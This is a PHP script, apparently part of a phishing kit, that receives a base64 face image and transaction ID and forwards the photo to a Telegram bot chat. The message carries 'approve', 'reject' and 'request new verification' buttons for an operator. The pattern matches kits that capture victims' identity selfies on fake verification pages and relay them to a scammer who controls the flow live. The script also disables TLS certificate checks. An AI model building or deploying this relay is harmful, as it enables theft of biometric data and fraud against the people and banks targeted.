<?php
header('Content-Type: application/json');

$config = require __DIR__ . '/config.php';

$imageData = $_POST['image'] ?? '';
$transactionId = $_POST['transactionId'] ?? '';

if (empty($imageData) || empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

// Decodificar base64
$imageData = str_replace('data:image/png;base64,', '', $imageData);
$imageData = str_replace(' ', '+', $imageData);
$imageBinary = base64_decode($imageData);

// Crear archivo temporal
$tempFile = tempnam(sys_get_temp_dir(), 'facial_') . '.png';
file_put_contents($tempFile, $imageBinary);

// Preparar datos para Telegram
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => "Aprobar Facial", 'callback_data' => "facial_ok:{$transactionId}"]
        ],
        [
            ['text' => "Rechazar Facial", 'callback_data' => "facial_error:{$transactionId}"]
        ],
        [
            ['text' => "Pedir Nueva Verificación", 'callback_data' => "facial_retry:{$transactionId}"]
        ]
    ]
];

$data = [
    'chat_id' => $config['chat_id'],
    'caption' => "Verificación Facial - Transaction ID: {$transactionId}",
    'photo' => new CURLFile($tempFile, 'image/png', 'facial.png'),
    'reply_markup' => json_encode($keyboard)
];

// Envío principal
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendPhoto");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

$response = curl_exec($ch);
curl_close($ch);

// Limpiar archivo temporal
unlink($tempFile);

// Respuesta
$result = json_decode($response, true);
echo json_encode([
    'status' => !empty($result['ok']) && $result['ok'] ? 'success' : 'error',
    'messageId' => !empty($result['ok']) && $result['ok'] ? $result['result']['message_id'] : null
]);
?>